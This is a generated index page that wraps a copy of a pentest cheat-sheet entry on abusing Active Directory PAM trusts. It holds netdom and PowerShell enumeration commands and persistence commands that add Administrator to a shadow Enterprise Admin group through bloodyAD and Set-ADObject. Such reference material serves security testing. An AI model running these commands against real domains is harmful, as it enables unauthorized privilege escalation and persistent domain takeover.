---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Trust - Privileged Access Management

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-trust-pam` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/trust-pam.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Trust - Privileged Access Management](../../topics/active-directory/trust-privileged-access-management.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-trust-pam |
| name | Trust - Privileged Access Management |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/trust-pam.md |

## Preserved Source Material

````yaml
_body: "# Trust - Privileged Access Management\n\n> PAM (Privileged Access Management) introduces bastion forest for management,\
  \ Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests\
  \ without making changes to groups or ACLs and without interactive logon.\n\nRequirements:\n\n* Windows Server 2016 or earlier\n\
  \nIf we compromise the bastion we get `Domain Admins` privileges on the other domain\n\n* Default configuration for PAM\
  \ Trust\n\n    ```ps1\n    # execute on our forest\n    netdom trust lab.local /domain:bastion.local /ForestTransitive:Yes\
  \ \n    netdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes \n    netdom trust lab.local /domain:bastion.local\
  \ /EnablePIMTrust:Yes \n    netdom trust lab.local /domain:bastion.local /Quarantine:No\n    # execute on our bastion\n\
  \    netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes\n    ```\n\n* Enumerate PAM trusts\n\n    ```ps1\n\
  \    # Detect if current forest is PAM trust\n    Import ADModule\n    Get-ADTrust -Filter {(ForestTransitive -eq $True)\
  \ -and (SIDFilteringQuarantined -eq $False)}\n\n    # Enumerate shadow security principals \n    Get-ADObject -SearchBase\
  \ (\"CN=Shadow Principal Configuration,CN=Services,\" + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties\
  \ * | select Name,member,msDS-ShadowPrincipalSid | fl\n\n    # Enumerate if current forest is managed by a bastion forest\n\
  \    # Trust_Attribute_PIM_Trust + Trust_Attribute_Treat_As_External\n    Get-ADTrust -Filter {(ForestTransitive -eq $True)}\
  \ \n    ```\n\n* Compromise\n    * Using the previously found Shadow Security Principal (WinRM account, RDP access, SQL,\
  \ ...)\n    * Using SID History\n* Persistence\n    * Windows/Linux:\n\n    ```ps1\n    bloodyAD --host 10.1.0.4 -u john.doe\
  \ -p 'Password123!' -d bloody add groupMember 'CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local'\
  \ Administrator\n    ```\n\n    * Windows only:\n\n    ```ps1\n    # Add a compromised user to the group \n    Set-ADObject\
  \ -Identity \"CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local\"\
  \ -Add @{'member'=\"CN=Administrator,CN=Users,DC=domain,DC=local\"}\n    ```\n\n## References\n\n* [How NOT to use the PAM\
  \ trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2019/04/abusing-PAM.html)"
_relative_path: active-directory/trust-pam.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/trust-pam.md
````
